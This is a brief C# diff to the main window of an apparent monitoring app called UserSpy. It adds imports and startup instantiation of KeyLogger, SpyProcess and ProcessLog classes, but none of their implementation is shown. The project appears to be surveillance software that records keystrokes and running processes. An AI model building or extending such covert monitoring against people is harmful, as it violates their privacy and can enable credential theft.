@@ -12,16 +12,23 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
-using UserSpy.keylogger;
+using keylogger;
+using spyprocess;
+using spyprocess.processlog;
+using spyprocess.processmodel;
 
 namespace UserSpy
 {    
     public partial class MainWindow : Window
     {
         KeyLogger logger;
+        SpyProcess SP;
+        ProcessLog PL;
         public MainWindow()
         {
             logger = new KeyLogger();
+            SP = new SpyProcess();
+            PL = new ProcessLog();
             InitializeComponent();            
         }
     }
